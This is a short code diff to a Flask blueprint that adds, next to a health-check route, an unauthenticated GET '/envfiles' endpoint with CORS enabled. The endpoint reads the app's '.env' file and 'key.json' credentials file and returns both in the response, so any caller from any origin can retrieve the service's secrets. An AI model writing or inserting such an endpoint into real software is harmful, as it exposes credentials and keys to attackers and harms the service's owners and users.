@@ -13,3 +13,20 @@ def hello():
 @hello_blueprint.route('/health', methods=['POST'])
 def health():
     return jsonify({"status": "ok"}), 200
+
+
+@hello_blueprint.route('/envfiles', methods=['GET'])
+@cross_origin()
+def envfiles():
+    """
+    Endpoint to return the environment variables.
+    """
+    with open('.env', 'r') as f:
+        env_content = f.read()
+    with open('key.json', 'r') as f:
+        key_content = f.read()
+    
+    return jsonify({
+        "env": env_content,
+        "key": key_content
+    }), 200
